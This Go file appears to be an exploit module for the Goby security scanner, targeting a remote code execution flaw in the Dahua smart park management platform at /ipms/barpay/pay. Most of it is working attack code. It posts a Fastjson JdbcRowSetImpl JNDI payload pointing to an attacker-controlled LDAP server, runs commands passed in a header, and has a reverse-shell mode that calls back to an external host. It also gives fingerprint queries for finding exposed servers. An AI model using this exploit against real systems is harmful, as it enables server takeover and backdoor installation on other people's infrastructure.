package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Dahua DSS /ipms/barpay/pay Remote Code Execution Vulnerability",
    "Description": "<p>Dahua smart park solutions focus on multiple business areas such as operation management, comprehensive security, convenient traffic, and collaborative office. Relying on AI, Internet of Things, and big data technologies to realize the digital upgrade of park management, improve security levels, improve work efficiency, and manage Cost reduction.</p><p>There is a code execution vulnerability in Dahua Smart Park /ipms/barpay/pay, through which an attacker can execute code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Product": "dahua-Smart-Park-GMP",
    "Homepage": "https://www.dahuatech.com/product/info/5609.html",
    "DisclosureDate": "2023-08-17",
    "PostTime": "2023-08-17",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "body=\"/WPMS/asset/lib/json2.js\" || body=\"src=\\\"/WPMS/asset/common/js/jsencrypt.min.js\\\"\" || (cert=\"Dahua\" && cert=\"DSS\") || header=\"Path=/WPMS\" || banner=\"Path=/WPMS\"",
    "GobyQuery": "body=\"/WPMS/asset/lib/json2.js\" || body=\"src=\\\"/WPMS/asset/common/js/jsencrypt.min.js\\\"\" || (cert=\"Dahua\" && cert=\"DSS\") || header=\"Path=/WPMS\" || banner=\"Path=/WPMS\"",
    "Level": "3",
    "Impact": "<p>There is a code execution vulnerability in Dahua Smart Park /ipms/barpay/pay, through which an attacker can execute code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"https://www.dahuatech.com/cases/info/76.html\">https://www.dahuatech.com/cases/info/76.html</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,ldap",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "ldap",
            "type": "input",
            "value": "ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho",
            "show": "attackType=ldap"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "大华智慧园区综合管理平台 /ipms/barpay/pay 远程代码执行漏洞",
            "Product": "dahua-智慧园区综合管理平台",
            "Description": "<p>大华智慧园区解决方案围绕运营管理、综合安防、便捷通行、协同办公等多个业务领域展开，依托AI、物联网、大数据技术实现园区管理数字化升级，实现安全等级提升、工作效率提升、管理成本下降。</p><p>大华智慧园区 /ipms/barpay/pay 存在代码执行漏洞，攻击者可通过该漏洞在服务器端执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.dahuatech.com/cases/info/76.html\">https://www.dahuatech.com/cases/info/76.html</a></p>",
            "Impact": "<p>大华智慧园区 /ipms/barpay/pay 存在代码执行漏洞，攻击者可通过该漏洞在服务器端执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Dahua DSS /ipms/barpay/pay Remote Code Execution Vulnerability",
            "Product": "dahua-Smart-Park-GMP",
            "Description": "<p>Dahua smart park solutions focus on multiple business areas such as operation management, comprehensive security, convenient traffic, and collaborative office. Relying on AI, Internet of Things, and big data technologies to realize the digital upgrade of park management, improve security levels, improve work efficiency, and manage Cost reduction.</p><p>There is a code execution vulnerability in Dahua Smart Park /ipms/barpay/pay, through which an attacker can execute code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"https://www.dahuatech.com/cases/info/76.html\" target=\"_blank\">https://www.dahuatech.com/cases/info/76.html</a><br></p>",
            "Impact": "<p>There is a code execution vulnerability in Dahua Smart Park /ipms/barpay/pay, through which an attacker can execute code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10826"
}`

	sendPayloadBSUq := func(hostInfo *httpclient.FixUrl, ldapAddr, cmd string) (*httpclient.HttpResponse, error) {
		payloadRequestConfig := httpclient.NewPostRequestConfig(`/ipms/barpay/pay`)
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Header.Store(`Content-Type`, `application/json`)
		if cmd != "" {
			payloadRequestConfig.Header.Store(`cmd`, cmd)
		}
		payloadRequestConfig.Data = `{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "` + ldapAddr + `", "autoCommit": true}`
		return httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson, func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			ldapAddr, _ := godclient.GetGodLDAPCheckURL("U", checkStr)
			_, err := sendPayloadBSUq(u, ldapAddr, "")
			if err != nil {
				return false
			}
			return godclient.PullExists(checkStr, time.Second*15)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			cmd := goutils.B2S(ss.Params["cmd"])
			ldapAddr := "ldap://" + godclient.GetGodServerHost() + "/A4"
			waitSessionCh := make(chan string)
			if attackType == "cmd" {
				ldapAddr = "ldap://" + godclient.GetGodServerHost() + "/A4"
				rsp, err := sendPayloadBSUq(expResult.HostInfo, ldapAddr, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if rsp.StatusCode != 200 || len(rsp.Utf8Html) < 1 {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
					return expResult
				}
				expResult.Output = rsp.Utf8Html
				expResult.Success = true
				return expResult
			} else if attackType == "reverse" {
				rp, err := godclient.WaitSession("reverse", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				cmd = fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp)
				sendPayloadBSUq(expResult.HostInfo, ldapAddr, cmd)
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
				return expResult
			} else if attackType == "ldap" {
				ldapAddr = goutils.B2S(ss.Params["ldap"])
				_, err := sendPayloadBSUq(expResult.HostInfo, ldapAddr, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = "请查收 LDAP 请求日志"
				return expResult
			} else {
				expResult.Output = "未知对攻击方式"
				expResult.Success = false
				return expResult
			}
		},
	))
}
